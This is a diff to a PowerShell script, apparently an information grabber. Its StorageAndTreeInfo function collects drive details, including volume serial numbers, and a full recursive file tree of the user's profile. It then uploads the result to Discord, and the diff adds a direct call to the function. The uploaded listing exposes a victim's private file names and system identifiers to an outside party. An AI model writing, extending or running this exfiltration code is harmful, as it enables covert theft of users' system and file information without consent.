@@ -187,25 +187,14 @@ function StorageAndTreeInfo {
     $storageFilePath = "C:\Temp\Storage_Info.txt"
     Set-Content -Path $storageFilePath -Value $null
 
-    Get-WmiObject Win32_LogicalDisk | ForEach-Object {
-        $driveLetter = $_.DeviceID
-        $driveLabel = $_.VolumeName
-        $driveType = $_.DriveType
-        $driveSize = [math]::Round(($_.Size / 1GB), 2)
-        $freeSpace = [math]::Round(($_.FreeSpace / 1GB), 2)
-        $usedSpace = $driveSize - $freeSpace
+    # Collect information about hard drives
+    $hardDriveInfo = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 3 } | Select-Object DeviceID, VolumeName, DriveType, FileSystem, VolumeSerialNumber, @{Name="SizeGB"; Expression={[math]::Round($_.Size / 1GB, 2)}}, @{Name="FreeSpaceGB"; Expression={[math]::Round($_.FreeSpace / 1GB, 2)}}, @{Name="FreeSpacePercent"; Expression={[math]::Round(($_.FreeSpace / $_.Size) * 100, 1)}}
 
-        $info = @"
-        Drive Letter: $driveLetter
-        Volume Label: $driveLabel
-        Drive Type: $driveType
-        Total Size: ${driveSize}GB
-        Used Space: ${usedSpace}GB
-        Free Space: ${freeSpace}GB
-"@
-        # Append information to the Storage_Info.txt file
-        Add-Content -Path $storageFilePath -Value $info
-    }
+    # Output hard drive information
+    $hardDriveInfo | Format-Table -AutoSize | Out-File -FilePath $storageFilePath -Append -Encoding utf8
+
+    # Add separator line
+    Add-Content -Path $storageFilePath -Value "------------------------------------------------------------------------------------------------------------------------------`n"
 
     # Run the 'tree' command and append the output to Storage_Info.txt
     tree $Env:userprofile /a /f | Out-File -FilePath $storageFilePath -Append -Encoding utf8
@@ -213,6 +202,10 @@ function StorageAndTreeInfo {
     # Upload Storage_Info.txt to Discord
     Upload-Discord -file $storageFilePath -text "Storage and Directory Tree Information :"
 }
+
+# Call the StorageAndTreeInfo function
+StorageAndTreeInfo
+
 
 
 # Function to get network information
